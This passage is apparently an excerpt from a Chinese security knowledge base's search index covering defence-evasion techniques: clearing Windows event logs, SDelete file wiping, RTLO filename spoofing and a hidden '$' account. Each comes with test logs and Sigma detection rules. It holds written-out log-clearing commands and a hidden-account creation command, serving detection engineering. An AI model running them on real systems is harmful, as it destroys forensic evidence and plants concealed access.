<p>\u4e8b\u4ef6\u5e72\u6270\u64cd\u4f5c\u548c\u5176\u4ed6\u53ef\u7528\u4e8e\u68c0\u6d4b\u5165\u4fb5\u6d3b\u52a8\u7684\u901a\u77e5\u53ef\u80fd\u4f1a\u635f\u5bb3\u5b89\u5168\u89e3\u51b3\u65b9\u6848\u7684\u5b8c\u6574\u6027\uff0c\u5bfc\u81f4\u4e8b\u4ef6\u65e0\u6cd5\u62a5\u544a\u3002\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u5bfc\u81f4\u53d6\u8bc1\u5206\u6790\u548c\u4e8b\u4ef6\u54cd\u5e94\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\uff0c\u56e0\u4e3a\u5b83\u4eec\u7f3a\u4e4f\u8db3\u591f\u7684\u6570\u636e\u6765\u786e\u5b9a\u53d1\u751f\u4e86\u4ec0\u4e48\u3002</p> <p>\u6e05\u9664Windows\u4e8b\u4ef6\u65e5\u5fd7</p> <p>Windows\u4e8b\u4ef6\u65e5\u5fd7\u662f\u8ba1\u7b97\u673a\u8b66\u62a5\u548c\u901a\u77e5\u8bb0\u5f55\u3002\u5fae\u8f6f\u5c06\u4e8b\u4ef6\u5b9a\u4e49\u4e3a\u201c\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u9700\u8981\u901a\u77e5\u7528\u6237\u6216\u5c06\u6761\u76ee\u6dfb\u52a0\u5230\u65e5\u5fd7\u4e2d\u7684\u4efb\u4f55\u91cd\u8981\u4e8b\u4ef6\u201d\u3002\u6709\u4e09\u4e2a\u7cfb\u7edf\u5b9a\u4e49\u7684\u4e8b\u4ef6\u6e90\uff1a\u7cfb\u7edf\u3001\u5e94\u7528\u548c\u5b89\u5168\u3002</p> <p>\u6267\u884c\u8d26\u53f7\u7ba1\u7406\u3001\u8d26\u53f7\u767b\u5f55\u548c\u76ee\u5f55\u670d\u52a1\u8bbf\u95ee\u7b49\u76f8\u5173\u64cd\u4f5c\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u6e05\u9664\u4e8b\u4ef6\u6765\u9690\u85cf\u5176\u6d3b\u52a8\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5b9e\u7528\u7a0b\u5e8f\u547d\u4ee4\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\uff1a</p> <p>\u00b7 wevtutil cl system</p> <p>\u00b7 wevtutil cl application</p> <p>\u00b7 wevtutil cl security</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u673a\u5236\uff08\u5982PowerShell\uff09\u6e05\u9664\u65e5\u5fd7\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>SDelete\u662f\u4e00\u4e2a\u5e26\u6709\u8bb8\u591a\u9009\u9879\u7684\u547d\u4ee4\u884c\u5b9e\u7528\u5de5\u5177\u3002\u6309\u7167\u4efb\u4f55\u7ed9\u5b9a\u7528\u6cd5\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u548c/\u6216\u76ee\u5f55\uff0c\u6216\u8005\u6e05\u7406\u903b\u8f91\u78c1\u76d8\u4e0a\u7684\u53ef\u7528\u7a7a\u95f4\u3002SDelete\u5c06\u901a\u914d\u7b26\u63a5\u53d7\u4e3a\u76ee\u5f55\u6216\u6587\u4ef6\u8bf4\u660e\u7b26\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#sdelete","title":"\u4e0b\u8f7dSDelete\u6587\u4ef6","text":"<p>\u4e0b\u8f7d\u5730\u5740: https://docs.microsoft.com/zh-cn/sysinternals/downloads/sdelete</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_4","title":"\u6267\u884c\u5220\u9664\u64cd\u4f5c","text":"<pre><code>C:\\Users\\12306Br0\\Desktop\\SDelete&gt;sdelete64.exe -s SDelete.zip\n\nSDelete v2.02 - Secure file delete\nCopyright (C) 1999-2018 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nSDelete is set for 1 pass.\nNo files/folders found that match SDelete.zip.\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>Event-ID: 4663\n\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002\n\n\u5bf9\u8c61:\n \u5b89\u5168 ID: SYSTEM\n \u5e10\u6237\u540d: 12306BR0-PC$\n \u5e10\u6237\u57df: WORKGROUP\n \u767b\u5f55 ID: 0x3e7\n\n\u5bf9\u8c61:\n \u5bf9\u8c61\u670d\u52a1\u5668: Security\n \u5bf9\u8c61\u7c7b\u578b: File\n \u5bf9\u8c61\u540d: C:\\Windows\\System32\\mapi32.dll\n \u53e5\u67c4 ID: 0x4e8\n\n\u8fdb\u7a0b\u4fe1\u606f:\n \u8fdb\u7a0b ID: 0x128\n \u8fdb\u7a0b\u540d: C:\\Windows\\servicing\\TrustedInstaller.exe\n\n\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f:\n \u8bbf\u95ee: DELETE\n\n \u8bbf\u95ee\u63a9\u7801: 0x10000\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u4f7f\u7528SDelete\u5b89\u5168\u5220\u9664\nstatus: experimental\ndescription: \u4f7f\u7528SDelete\u5de5\u5177\u5220\u9664\u6587\u4ef6\u65f6\u68c0\u6d4b\u6587\u4ef6\u91cd\u547d\u540d\nauthor: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1)\ndate: 2020/06/09\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet\n    - https://www.jpcert.or.jp/english/pub/sr/ir_research.html\n    - https://technet.microsoft.com/en-us/en-en/sysinternals/sdelete.aspx\ntags:\n    - attack.defense_evasion\n    - attack.t1027\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4656\n            - 4663\n            - 4658\n        ObjectName:\n            - '*.AAA'\n            - '*.ZZZ'\n    condition: selection\nfalsepositives:\n    - \u5408\u6cd5\u4f7f\u7528SDelete\uff0c\u6d4b\u8bd5\u7ed3\u679c\u4e0d\u5982\u4eba\u610f\uff0c\u5efa\u8bae\u8c28\u614e\u4f7f\u7528\nlevel: low\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_7","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1027-005-win-SDelete%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1027-005</p> <p>https://attack.mitre.org/techniques/T1027/005/</p> <p>MITRE-ATT&amp;CK-T1066</p> <p>https://attack.mitre.org/techniques/T1066/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/","title":"T1036-windows-\u9690\u85cf\u7528\u6237\u8d26\u6237\u5e26$\u7b26\u53f7","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f2a\u88c5\u6307\u7684\u662f\u653b\u51fb\u8005\u64cd\u7eb5\u6216\u6ee5\u7528\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0d\u7ba1\u662f\u5408\u6cd5\u8fd8\u662f\u6076\u610f\u7684\uff09\u7684\u540d\u79f0\u6216\u4f4d\u7f6e\u6765\u9003\u907f\u9632\u5fa1\u548c\u89c2\u5bdf\u3002\u5df2\u7ecf\u53d1\u73b0\u4e86\u4ee5\u4e0b\u51e0\u79cd\u6280\u672f\u53d8\u4f53\uff1a</p> <p>\u4e00\u79cd\u53d8\u4f53\u662f\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728\u901a\u5e38\u53d7\u4fe1\u4efb\u7684\u76ee\u5f55\u4e2d\uff0c\u6216\u8005\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u5408\u6cd5\u53d7\u4fe1\u4efb\u7a0b\u5e8f\u7684\u540d\u79f0\u3002\u53e6\u5916\uff0c\u4e5f\u53ef\u80fd\u5c06\u6587\u4ef6\u547d\u540d\u4e3a\u4e0e\u5408\u6cd5\u7a0b\u5e8f\u5f88\u76f8\u8fd1\u7684\u540d\u79f0\uff0c\u6216\u5176\u5b83\u65e0\u4f24\u5927\u96c5\u7684\u540d\u79f0\u3002\u6bd4\u5982\uff0c\u79fb\u52a8\u5e76\u91cd\u547d\u540d\u4e00\u4e2a\u516c\u5171\u7cfb\u7edf\u5b9e\u7528\u5de5\u5177\u6216\u7a0b\u5e8f\u6765\u89c4\u907f\u5176\u5bf9\u5176\u4f7f\u7528\u60c5\u51b5\u7684\u68c0\u6d4b\u3002\u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u7ed5\u8fc7\u4f9d\u8d56\u6587\u4ef6\u540d\u6216\u8def\u5f84\u6765\u4fe1\u4efb\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5de5\u5177\uff0c\u4ee5\u53ca\u901a\u8fc7\u5c06\u6587\u4ef6\u540d\u4e0e\u5176\u5b83\u5408\u6cd5\u4e8b\u7269\u76f8\u5173\u8054\u6765\u6b3a\u9a97\u9632\u5fa1\u7a0b\u5e8f\u548c\u7cfb\u7edf\u7ba1\u7406\u5458\u8ba4\u4e3a\u6587\u4ef6\u662f\u5584\u610f\u7684\u3002</p> <p>\u53e6\u5916\u4e00\u79cd\u53d8\u4f53\u4f7f\u7528\u4ece\u53f3\u5411\u5de6\u8986\u76d6\uff08RTLO\u6216RLO\uff09\u5b57\u7b26\uff08U+202E\uff09\u7684\u65b9\u6cd5\u8bf1\u9a97\u7528\u6237\u6267\u884c\u4ed6\u4eec\u8ba4\u4e3a\u7684\u5584\u610f\u6587\u4ef6\u7c7b\u578b\u4f46\u5b9e\u9645\u4e0a\u662f\u53ef\u6267\u884c\u4ee3\u7801\u3002RTLO\u662f\u975e\u6253\u5370\u5b57\u7b26\uff0c\u5b83\u4f1a\u5bfc\u81f4\u540e\u9762\u7684\u6587\u672c\u53cd\u5411\u663e\u793a\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u540d\u4e3aMarch 25 \\u202Excod.scr \u7684Windows\u5c4f\u5e55\u4fdd\u62a4\u7a0b\u5e8f\u6587\u4ef6\u5c06\u663e\u793a\u4e3aMarch 25 rcs.docx\uff0c\u540d\u4e3a photo_high_re\\u202Egnp.js \u7684JavaScript\u6587\u4ef6\u5c06\u663e\u793a\u4e3aphoto_high_resj.png\u3002\u8fd9\u79cd\u6280\u672f\u7684\u4e00\u4e2a\u5e38\u89c1\u505a\u6cd5\u662f\u4f7f\u7528\u7f51\u7edc\u9493\u9c7c\u653b\u51fb\u9644\u4ef6\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u6b3a\u9a97\u90ae\u4ef6\u53cc\u65b9\u548c\u9632\u5fa1\u7a0b\u5e8f\uff0c\u5982\u679c\u6070\u597d\u4ed6\u4eec\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5de5\u5177\u5982\u4f55\u663e\u793a\u548c\u5448\u73b0RTLO\u5b57\u7b26\u3002\u5728\u8bb8\u591a\u9488\u5bf9\u6027\u7684\u5165\u4fb5\u4f01\u56fe\u548c\u72af\u7f6a\u6d3b\u52a8\u4e2d\u90fd\u53ef\u4ee5\u770b\u5230RTLO\u5b57\u7b26\u7684\u4f7f\u7528\u3002RTLO\u4e5f\u53ef\u7528\u4e8eWindows\u6ce8\u518c\u8868\uff0c\u5176\u4e2dregedit.exe\u663e\u793a\u76f8\u53cd\u7684\u5b57\u7b26\uff0c\u4f46\u547d\u4ee4\u884c\u5de5\u5177reg.exe\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0d\u8fd9\u4e48\u663e\u793a\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4fee\u6539\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u5305\u62ec\u56fe\u6807\u3001\u7248\u672c\u3001\u4ea7\u54c1\u540d\u79f0\u3001\u63cf\u8ff0\u548c\u7248\u6743\u7b49\u5b57\u6bb5\uff0c\u4ee5\u4fbf\u66f4\u597d\u5730\u4e0e\u73af\u5883\u878d\u5408\uff0c\u589e\u52a0\u6b3a\u9a97\u5b89\u5168\u5206\u6790\u5e08\u6216\u4ea7\u54c1\u7684\u53ef\u80fd\u6027\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#windows","title":"Windows","text":"<p>\u5728\u8fd9\u79cd\u6280\u672f\u7684\u53e6\u4e00\u79cd\u53d8\u4f53\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u7684\u91cd\u547d\u540d\u526f\u672c\uff0c\u4f8b\u5982rundll32.exe\u3002\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\uff0c\u5c06\u5408\u6cd5\u5b9e\u7528\u7a0b\u5e8f\u79fb\u52a8\u5230\u5176\u4ed6\u76ee\u5f55\u5e76\u91cd\u547d\u540d\u6765\u89c4\u907f\u4ece\u975e\u6807\u51c6\u8def\u5f84\u6267\u884c\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\u7684\u68c0\u6d4b\u3002</p> <p>\u4e3e\u4f8b\uff1aWindows\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6eC:\\Windows\\System32\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201cexplorer.exe\u201d\u548c\u201csvchost.exe\u201d\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#linux","title":"Linux","text":"<p>\u6b64\u6280\u672f\u7684\u53e6\u4e00\u4e2a\u53d8\u4f53\u5305\u62ec\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u542f\u52a8\u540e\uff08\u4e0e\u4ee5\u524d\u76f8\u53cd\uff09\u5c06\u8fd0\u884c\u8fdb\u7a0b\u7684\u540d\u79f0\u66f4\u6539\u4e3a\u53ef\u4fe1\u6216\u826f\u6027\u8fdb\u7a0b\u7684\u540d\u79f0\u3002</p> <p>\u4e3e\u4f8b\uff1aLinux\u4e2d\uff0c\u653b\u51fb\u8005\u4f1a\u6ee5\u7528\u53d7\u4fe1\u4efb\u4f4d\u7f6e/bin\uff0c\u4f1a\u628a\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u547d\u540d\u4e3a\u53d7\u4fe1\u4efb\u4e8c\u8fdb\u5236\u540d\u79f0\u201crsyncd\u201d\u548c\u201cdbus-inotifier\u201d</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5229\u7528net\u547d\u4ee4\u6dfb\u52a0\u7528\u6237\uff0c\u4fee\u6539\u7528\u6237\u4e3a\u9690\u85cf\u7528\u6237\uff0c\u9690\u85cf\u6548\u679c\uff0c\u4ec5NET USER\u547d\u4ee4\u4e0d\u53ef\u67e5\u627e\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#net-user","title":"net user\u521b\u5efa\u7528\u6237","text":"<pre><code>C:\\Windows\\system32&gt;net user admin97$ admin /add\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n\n\nC:\\Windows\\system32&gt;net user\n\n\\\\12306BR0-PC \u7684\u7528\u6237\u5e10\u6237\n\n-------------------------------------------------------------------------------\n12306Br0                 admin.098                admin.123\nAdministrator            Guest\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_4","title":"\u4fee\u6539\u7528\u6237","text":"<p>\u65e0\u6d4b\u8bd5\u573a\u666f\uff0c\u5f85\u8865\u5145</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#event-id4720","title":"Event-ID:4720","text":"<pre><code>\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002\n\n\u4e3b\u9898:\n \u5b89\u5168 ID: 12306Br0-PC\\12306Br0\n \u5e10\u6237\u540d: 12306Br0\n \u5e10\u6237\u57df: 12306Br0-PC\n \u767b\u5f55 ID: 0x53e6a\n\n\u65b0\u5e10\u6237:\n \u5b89\u5168 ID: 12306Br0-PC\\admin97$\n \u5e10\u6237\u540d: admin97$\n \u5e10\u6237\u57df: 12306Br0-PC\n\n\u5c5e\u6027:\n SAM \u5e10\u6237\u540d: admin97$\n \u663e\u793a\u540d\u79f0: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u7528\u6237\u4e3b\u4f53\u540d\u79f0: -\n \u4e3b\u76ee\u5f55: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u4e3b\u9a71\u52a8\u5668: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u811a\u672c\u8def\u5f84: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u7528\u6237\u5de5\u4f5c\u7ad9: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:&lt;\u4ece\u4e0d&gt;\n \u5e10\u6237\u8fc7\u671f: &lt;\u4ece\u4e0d&gt;\n \u4e3b\u8981\u7ec4 ID: 513\n \u5141\u8bb8\u59d4\u6258\u7ed9: -\n \u65e7 UAC \u503c: 0x0\n \u65b0 UAC \u503c: 0x15\n \u7528\u6237\u5e10\u6237\u63a7\u5236:\n \u5df2\u7981\u7528\u7684\u5e10\u6237\n '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528\n '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528\n \u7528\u6237\u53c2\u6570: &lt;\u672a\u8bbe\u7f6e\u503c&gt;\n SID \u5386\u53f2: -\n \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8\n\n\u9644\u52a0\u4fe1\u606f:\n \u7279\u6743 -\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5728\u5c5e\u6027'SamAccountName'\u4e2d\u4f7f\u7528'$'\u7684\u65b0\u7528\u6237\u5e10\u6237\u6216\u91cd\u547d\u540d\u7528\u6237\u5e10\u6237\nstatus: experimental\ndescription: \u901a\u8fc7\u5f02\u5e38\u7684\u7528\u6237\u5e10\u6237\u540d\u68c0\u6d4b\u53ef\u80fd\u7684\u65c1\u8defEDR\u548cSIEM\u3002\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nauthor: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1)\ndate: 2020/06/09\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4720 # \u521b\u5efa\u7528\u6237\n            - 4781 # \u4fee\u6539\u7528\u6237\u540d\n        UserName|contains: '$'    #Sam\u7528\u6237\u540d\n    condition: selection\nfields:\n    - EventID\n    - UserName\n    - SubjectAccountName\nfalsepositives:\n    - Unkown\nlevel: high\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_7","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1036-win-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E5%B8%A6%24%E7%AC%A6%E5%8F%B7/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1036</p> <p>https://attack.mitre.org/techniques/T1036/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/","title":"T1070-001-win-\u4f7f\u7528wevtutil\u547d\u4ee4\u5220\u9664\u65e5\u5fd7","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002</p> <p>\u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002</p> <p>\u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002</p> <p>\u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<pre><code>wevtutil.exe cl 